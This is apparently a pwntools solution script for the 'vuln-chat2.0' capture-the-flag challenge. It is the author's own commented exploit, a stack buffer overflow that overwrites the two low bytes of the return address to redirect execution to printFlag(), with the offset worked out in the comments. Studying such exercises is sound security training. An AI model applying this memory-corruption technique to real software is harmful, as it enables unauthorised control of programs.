import pwn

# vuln-chat2.0 is a 32-bit dynamically linked binary
# NX is enabled, ASLR is on

# This is a super simple exploit
# There is a basic buffer overflow that lets you overwrite just two bytes of the return address
# You can just change those two bytes to get the printFlag() function to get called instead of returning to main

target = pwn.process('./vuln-chat2.0')
# pwn.gdb.attach(target, gdbscript="b *0x08048635") # an address towards the end of dostuff()

# The second read in dostuff() reads 0x2d (45) bytes into a 20 byte buffer inp1

# Calculating distance to return address:
# after sending an enumeration payload b'aaaabbbbcccc' as our second input and breaking near the end of dostuff()
# we can run search-pattern aaaabbbbcccc in gef:
# This gives us 0xffa30695
# The second value in telescope -l 5 $ebp will be the stack location of the return address
# Can double check this because it should be pointing to the instruction in main() right after dostuff() is called
# This value is 0xffa306c0
# 0xffa306c0 - 0xffa30695 = 43 = the distance between the start of our buffer and the return address

# So, we can write 45 bytes, and the distance to the return address is 43 bytes, which means we can overwrite the 2 lsbs of the return address
# There is a function at 0x8048672 called printFlag()
# The value in the return address is 0x08048668
# So writing a 43 byte overflow and then \x72 \x86 should cause printFlag() to get called


target.sendline(b'scott') # first user input

target.recvuntil(b'scott:')
# target.sendline(b'aaaabbbbcccc') # enumeration payload
payload = b'a' * 43
payload += b'\x72\x86'
target.sendline(payload)

target.recvuntil(b'Found it')
out = target.recvuntil(b'}')
index = out.find(b'{')
print(out[index:])